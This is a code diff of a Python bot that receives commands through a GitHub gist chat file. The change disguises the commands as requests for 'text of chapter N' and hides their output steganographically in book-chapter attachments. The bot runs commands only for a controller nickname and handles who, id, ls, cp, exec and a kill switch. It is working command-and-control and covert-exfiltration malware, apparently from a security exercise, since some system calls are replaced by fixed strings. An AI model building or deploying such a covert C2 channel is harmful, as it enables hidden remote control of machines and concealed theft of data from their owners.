@@ -1,19 +1,22 @@
 import base64
+import uuid
+import sys
 from time import sleep
 from subprocess import check_output
 from os import path
-import sys
 
 sys.path.append('..')
-from common.utils import add_message, check_chat_file, get_last_commands, replace_newlines_with_spaces
+from common.utils import add_message, check_chat_file, get_last_messages, replace_newlines_with_spaces
 from common.utils import CONTROLLER_NICK_NAME, BOT_NICK_NAME
 from common.gist import pull_gist, init_gist
+from common.chapters import get_command_for_chapter, read_chapter
+from common.steganography import encode_to_text
 
 SLEEP_TIME = 10
 
 
 def process_who():
-    return check_output('w', shell=True).decode('utf-8').strip()
+    return 'root'  # check_output('w', shell=True).decode('utf-8').strip()
 
 
 def process_ls(dir_path):
@@ -23,7 +26,7 @@ def process_ls(dir_path):
 
 
 def process_id():
-    return check_output('id', shell=True).decode('utf-8').strip()
+    return 'id: 7777'  # check_output('id', shell=True).decode('utf-8').strip()
 
 
 def process_cp(file_path):
@@ -40,39 +43,55 @@ def process_exec(file_path):
     return ''
 
 
-def process_cmd(sender, msg_id, cmd):
-    if len(cmd) == 0 or sender != CONTROLLER_NICK_NAME:
+def process_msg(sender, msg_id, msg):
+    if len(msg) == 0 or sender != CONTROLLER_NICK_NAME:
         return
 
-    if cmd == 'w':
-        result = process_who()
-        print(f'who reply: {result}')
-    elif cmd.startswith('ls '):
-        result = process_ls(cmd[3:])
-        print(f'ls reply: {result}')
-    elif cmd == 'id':
-        result = process_id()
-        print(f'id reply: {cmd}')
-    elif cmd.startswith('cp '):
-        result = process_cp(cmd[3:])
-        print(f'cp reply: {result}')
-    elif cmd.startswith('exec '):
-        result = process_exec(cmd[5:])
-        print(f'exec reply: {result}')
+    if msg.startswith('Send me text of chapter '):
+        chapter_num = int(msg[24]) if msg[25] == ',' else int(msg[24:26])
+        cmd = get_command_for_chapter(chapter_num)
+
+        if cmd == 'w':
+            result = process_who()
+            print(f'>>> who reply: {result}')
+        elif cmd == 'id':
+            result = process_id()
+            print(f'>>> id reply: {result}')
+        elif cmd == 'kill':
+            return 'kill'
+        else:
+            print(f'>>> Invalid command: "{cmd}" without path', flush=True)
+            return
+
+        chapter = read_chapter(chapter_num)
+        encoded, encoded_len = encode_to_text(result, chapter)
+        attachment = {
+            'name': str(uuid.uuid4()) + '.txt',
+            'content': encoded[0:int(encoded_len*1.2)],
+        }
+        add_message('Text of the chapter is in the attachment', BOT_NICK_NAME, reply_to=msg_id, attachment=attachment)
+
+    elif msg.startswith('ls '):
+        result = process_ls(msg[3:])
+        print(f'>>> ls reply: {result}')
+    elif msg.startswith('cp '):
+        result = process_cp(msg[3:])
+        print(f'>>> cp reply: {result}')
+    elif msg.startswith('exec '):
+        result = process_exec(msg[5:])
+        print(f'>>> exec reply: {result}')
     else:
-        print(f'Unknown command: "{cmd}"')
+        print(f'>>> Unknown command: "{msg}"', flush=True)
         return
     print(flush=True)
 
-    add_message(result, BOT_NICK_NAME, reply_to=msg_id)
-
 
 def run():
-    print('Bot is starting...')
+    print('>>> Bot is starting...', flush=True)
     init_gist()
     max_msg_id = check_chat_file()
     # TODO - check previous commands?
-    print('Bot is running...')
+    print('>>> Bot is running...', flush=True)
 
     is_killed = False
 
@@ -83,17 +102,19 @@ def run():
 
         if new_max_msg_id > max_msg_id:
             count = new_max_msg_id - max_msg_id
-            print(f'Processing {count} new messages...', flush=True)
-            commands = get_last_commands(count)
-            for (sender, msg_id, cmd) in commands:
-                if cmd == 'kill':
-                    print('Killing the bot...')
+            print(f'>>> Processing {count} new messages...', flush=True)
+
+            messages = get_last_messages(count)
+            for (sender, msg_id, msg) in messages:
+                result = process_msg(sender, msg_id, msg)
+                if result == 'kill':
+                    print('>>> Killing the bot...')
                     is_killed = True
                     break
-                process_cmd(sender, msg_id, cmd)
+
             max_msg_id = new_max_msg_id
         else:
-            print('No new messages...', flush=True)
+            print('>>> No new messages...', flush=True)
 
 
 if __name__ == '__main__':
